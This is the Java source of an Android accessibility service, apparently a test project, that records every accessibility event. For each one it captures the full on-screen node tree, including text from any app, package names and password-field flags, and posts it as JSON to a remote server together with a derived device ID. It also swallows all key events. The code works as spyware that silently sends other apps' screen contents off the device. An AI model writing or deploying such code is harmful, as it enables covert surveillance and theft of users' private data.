package com.example.lixiaoqing.myaccessibility;

import android.accessibilityservice.AccessibilityService;
import android.graphics.Rect;
import android.os.Build;
import android.support.annotation.NonNull;
import android.util.Base64;
import android.util.Log;
import android.view.KeyEvent;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import android.view.accessibility.AccessibilityWindowInfo;

import com.alibaba.fastjson.JSON;
import com.example.lixiaoqing.myaccessibility.bean.EventInfo;
import com.example.lixiaoqing.myaccessibility.bean.NoteInfo;
import com.example.lixiaoqing.myaccessibility.tools.HttpUtils;

import java.util.ArrayList;
import java.util.List;
import java.util.UUID;

public class MyService extends AccessibilityService {

    private static String TAG ="lxq_test";

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
    }

    @Override
    protected boolean onGesture(int gestureId) {
        return super.onGesture(gestureId);
    }

    @Override
    public List<AccessibilityWindowInfo> getWindows() {
        return super.getWindows();
    }

    @Override
    public AccessibilityNodeInfo getRootInActiveWindow() {
        return super.getRootInActiveWindow();
    }

    @Override
    public AccessibilityNodeInfo findFocus(int focus) {
        return super.findFocus(focus);
    }

    @Override
    public Object getSystemService(@NonNull String name) {
        return super.getSystemService(name);
    }

    //接收按键事件
    @Override
    protected boolean onKeyEvent(KeyEvent event) {
        return true;
    }

//    服务中断，如授权关闭或者将服务杀死
    @Override
    public void onInterrupt() {
        Log.d(TAG, "server be killed");
    }

//   接收事件,如触发了通知栏变化、界面变化等
    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        LogNote(event);
    }

    private void LogNote(AccessibilityEvent event){

        if (null == event){
            Log.d(TAG, "event is null !");
            return;
        }

        if(null == event.getSource()){
            return;
        }

        EventInfo eventInfo = new EventInfo();
        eventInfo.setAction(event.getAction());
        eventInfo.setAddedCount(event.getAddedCount());
        eventInfo.setBeforeText(null == event.getBeforeText() ? null : event.getBeforeText().toString());
        eventInfo.setChecked(event.isChecked());
        eventInfo.setContentDescription(null == event.getContentDescription() ? null : event.getContentDescription().toString());
        eventInfo.setCurrentItemIndex(event.getCurrentItemIndex());
        eventInfo.setEnabled(event.isEnabled());
        eventInfo.setEventTime(System.currentTimeMillis());
        eventInfo.setEventType(event.getEventType());
        eventInfo.setFromIndex(event.getFromIndex());
        eventInfo.setFullScreen(event.isFullScreen());
        eventInfo.setItemCount(event.getItemCount());
        eventInfo.setMaxScrollX(event.getMaxScrollX());
        eventInfo.setMaxScrollY(event.getMaxScrollY());
        eventInfo.setMovementGranularity(event.getMovementGranularity());
        eventInfo.setPackageName(null == event.getPackageName() ? null : event.getPackageName().toString());
        eventInfo.setParcelableData(event.getParcelableData());
        eventInfo.setPassword(event.isPassword());
        eventInfo.setRecordCount(event.getRecordCount());
        eventInfo.setRemovedCount(event.getRemovedCount());
        eventInfo.setScrollable(event.isScrollable());
        eventInfo.setScrollX(event.getScrollX());
        eventInfo.setScrollY(event.getScrollY());

        List<String> eventText = null;
        if (null != event.getText() && !event.getText().isEmpty()){
            eventText = new ArrayList<>(event.getText().size());
            for (int i=0; i<event.getText().size(); i ++){
                if (null != event.getText().get(i)){
                    eventText.add(event.getText().get(i).toString());
                }
            }
        }

        eventInfo.setText(eventText);
        eventInfo.setToIndex(event.getToIndex());

        eventInfo.setBase(getNoteInfo(this.getRootInActiveWindow()));
        eventInfo.setSource(getNoteInfo(event.getSource()));

        String json = JSON.toJSONString(eventInfo);
        Log.d(TAG, json);

        new HttpUtils().httpPost(Properties.NET_ADDRESS+"?id=" + getUniquePseudoID(), json);
    }

    private NoteInfo getNoteInfo(AccessibilityNodeInfo accessibilityNodeInfo){

        if (null == accessibilityNodeInfo){
            return null;
        }

        NoteInfo noteInfo = new NoteInfo();

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            noteInfo.setActions(accessibilityNodeInfo.getActionList());
            noteInfo.setError(null == accessibilityNodeInfo.getError() ? null : accessibilityNodeInfo.getError().toString());
            noteInfo.setMaxTextLength(accessibilityNodeInfo.getMaxTextLength());
        }

        noteInfo.setCheckable(accessibilityNodeInfo.isCheckable());
        noteInfo.setChecked(accessibilityNodeInfo.isChecked());
        noteInfo.setClassName(null == accessibilityNodeInfo.getClassName() ? null : accessibilityNodeInfo.getClassName().toString());
        noteInfo.setClickable(accessibilityNodeInfo.isClickable());
        noteInfo.setContentDescription(null == accessibilityNodeInfo.getContentDescription() ? null : accessibilityNodeInfo.getContentDescription().toString());
        noteInfo.setEnabled(accessibilityNodeInfo.isEnabled());
        noteInfo.setFocusable(accessibilityNodeInfo.isFocusable());
        noteInfo.setFocused(accessibilityNodeInfo.isFocused());
        noteInfo.setLongClickable(accessibilityNodeInfo.isLongClickable());
        noteInfo.setPackageName(null == accessibilityNodeInfo.getPackageName() ? null : accessibilityNodeInfo.getPackageName().toString());
        noteInfo.setPassword(accessibilityNodeInfo.isPassword());

        Rect outBounds = new Rect();
        accessibilityNodeInfo.getBoundsInScreen(outBounds);
        noteInfo.setRectInScreen(outBounds);

        noteInfo.setScrollable(accessibilityNodeInfo.isScrollable());
        noteInfo.setSelected(accessibilityNodeInfo.isSelected());
        noteInfo.setText(null == accessibilityNodeInfo.getText() ? null : accessibilityNodeInfo.getText().toString());

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.JELLY_BEAN_MR2) {
            noteInfo.setViewIdResName(accessibilityNodeInfo.getViewIdResourceName());
        }

        for(int i = 0; i<accessibilityNodeInfo.getChildCount(); i++){

            noteInfo.setChildren(getNoteInfo(accessibilityNodeInfo.getChild(i)));
        }

        return noteInfo;
    }

    // get device id
    @SuppressWarnings("unused")
    public String getUniquePseudoID() {

        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.GINGERBREAD){
            return "";
        }

        String serial;

        String m_szDevIDShort = "35" + Build.BOARD.length() % 10 + Build.BRAND.length() % 10 + Build.SUPPORTED_ABIS[0].length() % 10 + Build.DEVICE.length() % 10 + Build.DISPLAY.length() % 10 + Build.HOST.length() % 10 + Build.ID.length() % 10 + Build.MANUFACTURER.length() % 10 + Build.MODEL.length() % 10 + Build.PRODUCT.length() % 10 + Build.TAGS.length() % 10 + Build.TYPE.length() % 10 + Build.USER.length() % 10; //13

        try {
            serial = android.os.Build.class.getField("SERIAL").get(null).toString();
        } catch (Exception ignored) {
            serial = "serial";
        }

        String id = new UUID(m_szDevIDShort.hashCode(), serial.hashCode()).toString();

        return ToBase64StringForUrl(id.getBytes());

    }

    public static String ToBase64StringForUrl(byte[] bytes)
    {
        return new String (Base64.encode(bytes, Base64.URL_SAFE));
    }
}
